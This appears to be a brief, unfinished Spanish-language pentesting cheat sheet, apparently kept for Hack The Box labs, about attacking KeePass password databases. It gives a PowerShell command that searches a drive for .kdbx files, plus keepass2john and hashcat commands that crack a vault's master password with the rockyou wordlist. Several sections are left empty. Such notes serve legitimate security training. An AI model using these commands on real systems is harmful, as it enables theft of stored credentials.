
## DESCRIPTION

ENUMERACION
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

#### Mas información
* 


## EXPLOITATION

### OPTION 1: HASHCAT

```
#SACAR A UN FORMATO HASH
keepass2john Database.kdbx > keepass.hash

#MIRAR EL CODIGO DE HASHCAT
hashcat --help | grep -i "KeePass"

#CRACKING
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

```



## MACHINES

* Hack The Box: 

**!!NOTA IMPORTANTE!!** 